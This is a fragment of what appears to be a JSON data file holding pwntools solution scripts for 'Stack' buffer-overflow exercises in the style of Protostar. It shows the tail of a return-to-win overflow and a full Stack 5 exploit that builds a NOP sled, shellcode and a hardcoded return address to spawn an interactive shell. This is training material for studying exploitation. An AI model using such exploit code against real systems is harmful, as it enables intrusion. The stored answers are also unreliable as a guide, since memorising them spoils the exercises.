p32(elf.sym['win']) buf_size = 76  payload = b\"A\"*buf_size payload += win_func  p.sendline(payload) p.interactive()   Stack 5  #!/usr/bin/python  from pwn import *  binary = \"./stack5\" elf = ELF(binary) p = process(binary)  buf_size = 76 shellcode = asm(shellcraft.sh()) ret_addr = p32(0xffffcdd0) # buffer address  payload = b\"\\x90\"*(buf_size - len(shellcode)) payload += shellcode payload += ret_addr  log.info(f\"Buffer size: {buf_size}\") log.info(f\"Shellcode size: {len(shellcode)}\") log.info(f\"NOP sled size: {buf_size - len(shellcode)}\") log.info(f\"Return address: {hex(u32(ret_addr))}\") log.info(f\"Payload: {payload}\")  p.sendline(payload) p.interactive()"
  }
  
]

